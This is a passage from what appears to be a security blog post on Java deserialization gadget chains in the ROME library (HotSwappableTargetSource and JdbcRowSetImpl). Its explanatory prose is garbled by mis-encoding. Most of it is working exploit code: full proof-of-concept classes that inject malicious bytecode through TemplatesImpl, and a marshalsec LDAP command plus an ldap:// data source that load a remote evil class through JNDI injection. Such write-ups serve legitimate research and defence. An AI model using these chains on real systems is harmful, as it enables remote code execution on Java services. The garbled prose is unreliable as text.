java.io.<span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.ObjectOutputStream(fos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        java.io.<span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.FileInputStream(Filename);</span><br><span class="line">        java.io.<span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.ObjectInputStream(fis);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="HotSwappleTargetSourceé“¾"><a href="#HotSwappleTargetSourceé“¾" class="headerlink" title="HotSwappleTargetSourceé“¾"></a>HotSwappleTargetSourceé“¾</h3><p>springçš„toStringé“¾</p><p>éœ€è¦å†åŠ ä¸ªspringä¾èµ–ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.3.28<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.springframework/spring-beans --&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-beans<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.3.28<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-context<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.3.28<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>HotSwappableTargetSource ä½äº<code>org.springframework.aop.target</code>åŒ…ä¸‹ï¼Œå¯ä»¥åœ¨ä»£ç† bean è¿è¡Œçš„è¿‡ç¨‹ä¸­ï¼ŒåŠ¨æ€å®æ—¶æ›´æ–° bean å¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯çƒ­åŠ è½½</p><p>åˆ©ç”¨é“¾</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HashMap.readObject</span><br><span class="line">HashMap.putVal</span><br><span class="line">HotSwappableTargetSource.equals</span><br><span class="line">XString.equals</span><br><span class="line">ToStringBean.toString</span><br></pre></td></tr></table></figure><p>å…¶ä¸­HostSwappableTargetSource.equalsï¼Œéœ€è¦ä¼ å¦ä¸€ä¸ªHotSwappableTargetSourceï¼Œæ‰èƒ½å–åˆ°Target</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240923215255276.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240923215255276.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è§¦å‘key.equalså¹¶ä¼ å…¥æˆ‘ä»¬éœ€è¦çš„å‚æ•°kï¼Œåœ¨ä¸Šæ¬¡åˆ†æjdk7u21æ—¶è®²è¿‡äº†</p><p><a href="https://godownio.github.io/2024/09/18/jdk7u21-jdk8u20-yuan-sheng-unserialize/#%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E8%A7%A6%E5%8F%91equalsImpl">https://godownio.github.io/2024/09/18/jdk7u21-jdk8u20-yuan-sheng-unserialize/#%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E8%A7%A6%E5%8F%91equalsImpl</a></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240923220034607.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240923220034607.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>key.equals(k)ã€‚å…ˆputè¿›å‚æ•°kï¼Œå†putè¿›key</p><p>è¿™é‡Œä¹‹æ‰€ä»¥èƒ½ç›´æ¥èµ°è¿›elseé‡Œï¼Œæ˜¯å› ä¸ºHotSwappableTargetSource.hashCodeéƒ½æ˜¯è¿”å›åŒä¸€ä¸ªå€¼</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240926132312495.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240926132312495.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>POCï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.exploit.third.rome;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.target.HotSwappableTargetSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="comment">//HashMap.readObject</span></span><br><span class="line"><span class="comment">//HashMap.putVal</span></span><br><span class="line"><span class="comment">//HotSwappableTargetSource.equals</span></span><br><span class="line"><span class="comment">//XString.equals</span></span><br><span class="line"><span class="comment">//ToStringBean.toString</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">rome_HotSwappableTargetSource</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code1 = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\CODE_COLLECT\\Idea_java_ProTest\\my-yso\\target\\classes\\RuntimeEvil.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesClass</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Field[] fields = templatesClass.getClass().getDeclaredFields();</span><br><span class="line">        <span class="keyword">for</span> (Field field : fields) &#123;</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_bytecodes&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code1&#125;);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_name&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="string">&quot;godown&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_tfactory&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">fakeTemplates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, fakeTemplates);</span><br><span class="line">        <span class="type">XString</span> <span class="variable">xString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XString</span>(<span class="literal">null</span>);</span><br><span class="line"><span class="comment">//        xString.equals(toStringBean);</span></span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">hotSwappableTargetSource_InputObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(toStringBean);</span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">hotSwappableTargetSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(xString);</span><br><span class="line"><span class="comment">//        hotSwappableTargetSource.equals(hotSwappableTargetSource_InputObj);</span></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(hotSwappableTargetSource_InputObj,<span class="string">&quot;godown&quot;</span>);</span><br><span class="line">        hashMap.put(hotSwappableTargetSource,<span class="string">&quot;godown&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">toStringBean_objField</span> <span class="operator">=</span> ToStringBean.class.getDeclaredField(<span class="string">&quot;_obj&quot;</span>);</span><br><span class="line">        toStringBean_objField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        toStringBean_objField.set(toStringBean, templatesClass);</span><br><span class="line">        serialize(hashMap);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        java.io.<span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.FileOutputStream(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        java.io.<span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.ObjectOutputStream(fos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        java.io.<span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.FileInputStream(Filename);</span><br><span class="line">        java.io.<span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.ObjectInputStream(fis);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ï¼ˆjdk8 putVal()å¹¶æ²¡æœ‰jdk7u21 putè¦hashç¢°æ’è¿›å…¥å¾ªç¯æ‰èƒ½æ‰§è¡Œequals</p><p>ä½ ç”šè‡³å¯ä»¥ç±»ä¼¼7u21åœ¨å¤–é¢å¥—ä¸ªHashSetæˆ–è€…LinkedHashSetã€‚ã€‚å¥½ç¥é‡‘å“ˆå“ˆ</p><p>å¥—LinkedHashSetç¥é‡‘POCï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.exploit.third.rome;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.target.HotSwappableTargetSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.LinkedHashSet;</span><br><span class="line"></span><br><span class="line"><span class="comment">//HashMap.readObject</span></span><br><span class="line"><span class="comment">//HashMap.putVal</span></span><br><span class="line"><span class="comment">//HotSwappableTargetSource.equals</span></span><br><span class="line"><span class="comment">//XString.equals</span></span><br><span class="line"><span class="comment">//ToStringBean.toString</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ROME_HotSwappable_LinkedHashSet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code1 = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\CODE_COLLECT\\Idea_java_ProTest\\my-yso\\target\\classes\\RuntimeEvil.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesClass</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Field[] fields = templatesClass.getClass().getDeclaredFields();</span><br><span class="line">        <span class="keyword">for</span> (Field field : fields) &#123;</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_bytecodes&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code1&#125;);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_name&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="string">&quot;godown&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_tfactory&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">fakeTemplates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, fakeTemplates);</span><br><span class="line">        <span class="type">XString</span> <span class="variable">xString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XString</span>(<span class="literal">null</span>);</span><br><span class="line"><span class="comment">//        xString.equals(toStringBean);</span></span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">hotSwappableTargetSource_InputObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(toStringBean);</span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">hotSwappableTargetSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(xString);</span><br><span class="line"><span class="comment">//        hotSwappableTargetSource.equals(hotSwappableTargetSource_InputObj);</span></span><br><span class="line">        <span class="type">LinkedHashSet</span> <span class="variable">linkedHashSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LinkedHashSet</span>();</span><br><span class="line">        linkedHashSet.add(hotSwappableTargetSource_InputObj);</span><br><span class="line">        linkedHashSet.add(hotSwappableTargetSource);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">toStringBean_objField</span> <span class="operator">=</span> ToStringBean.class.getDeclaredField(<span class="string">&quot;_obj&quot;</span>);</span><br><span class="line">        toStringBean_objField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        toStringBean_objField.set(toStringBean, templatesClass);</span><br><span class="line">        serialize(linkedHashSet);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        java.io.<span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.FileOutputStream(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        java.io.<span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.ObjectOutputStream(fos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        java.io.<span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.FileInputStream(Filename);</span><br><span class="line">        java.io.<span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.ObjectInputStream(fis);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="JdbcRowSetImplé“¾"><a href="#JdbcRowSetImplé“¾" class="headerlink" title="JdbcRowSetImplé“¾"></a>JdbcRowSetImplé“¾</h3><p>åˆ©ç”¨é“¾ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HashMap&lt;K,V&gt;.readObject(ObjectInputStream)</span><br><span class="line">HashMap&lt;K,V&gt;.hash(Object)</span><br><span class="line">ObjectBean.hashCode()</span><br><span class="line">EqualsBean.hashCode()                  </span><br><span class="line">EqualsBean.beanHashCode()</span><br><span class="line">ToStringBean.toString()</span><br><span class="line">ToStringBean.toString(String)</span><br><span class="line">JdbcRowSetImpl.getDatabaseMetaData</span><br><span class="line">BaseRowSet.getDataSourceName</span><br></pre></td></tr></table></figure><p>é€‚ç”¨äºè¿‡æ»¤äº†TemplatesImplçš„æƒ…å†µ</p><p>JdbcRowSetImpl.getDatabaseMetaDataè°ƒç”¨äº†connect</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240924154311815.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240924154311815.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>connecté‡Œè°ƒç”¨äº†InitialContext.lookup</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240924154357757.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240924154357757.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è¿›ä¸€æ­¥è°ƒç”¨äº†getURLOrDefaultInitCtx(name).lookup(name)</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240924154707166.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240924154707166.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ç›´æ¥è½¬JNDIæ³¨å…¥äº†ï¼Œæœ¬åœ°æ¶æ„ç±»Pathèµ·ä¸€ä¸ªhttpæœåŠ¡ï¼Œmarshalsecèµ·ä¸€ä¸ªldapæœåŠ¡ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8888/#RuntimeEvil 1099</span><br></pre></td></tr></table></figure><p>POCï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="comment">//HashMap&lt;K,V&gt;.readObject(ObjectInputStream)</span></span><br><span class="line"><span class="comment">//HashMap&lt;K,V&gt;.hash(Object)</span></span><br><span class="line"><span class="comment">//ObjectBean.hashCode()</span></span><br><span class="line"><span class="comment">//EqualsBean.hashCode()</span></span><br><span class="line"><span class="comment">//EqualsBean.beanHashCode()</span></span><br><span class="line"><span class="comment">//ToStringBean.toString()</span></span><br><span class="line"><span class="comment">//ToStringBean.toString(String)</span></span><br><span class="line"><span class="comment">//JdbcRowSetImpl.getDataSourceName</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Rome_JdbcRowSetImpl</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">JdbcRowSetImpl</span> <span class="variable">jdbcRowSetImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JdbcRowSetImpl</span>();</span><br><span class="line">        jdbcRowSetImpl.setDataSourceName(<span class="string">&quot;ldap://fake/#JNDI_RuntimeEvil&quot;</span>);</span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(JdbcRowSetImpl.class,jdbcRowSetImpl);</span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ToStringBean.class,toStringBean);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(objectBean,<span class="string">&quot;godown&quot;</span>);</span><br><span class="line">        jdbcRowSetImpl.setDataSourceName(<span class="string">&quot;ldap://127.0.0.1:1099/#JNDI_RuntimeEvil&quot;</span>);</span><br><span class="line">        serialize(hashMap);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    